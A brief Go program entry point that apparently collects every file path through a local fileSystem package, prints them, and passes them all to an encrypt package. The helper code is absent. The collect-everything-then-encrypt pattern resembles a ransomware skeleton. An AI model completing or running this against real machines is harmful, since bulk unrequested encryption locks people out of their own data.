package main

import (
	"fmt"

	"./encrypt"
	"./fileSystem"
)

func main() {
	filePath := fileSystem.GetAllFile()
	for _, name := range filePath {
		fmt.Println(name)
	}
	encrypt.Run(filePath)
}
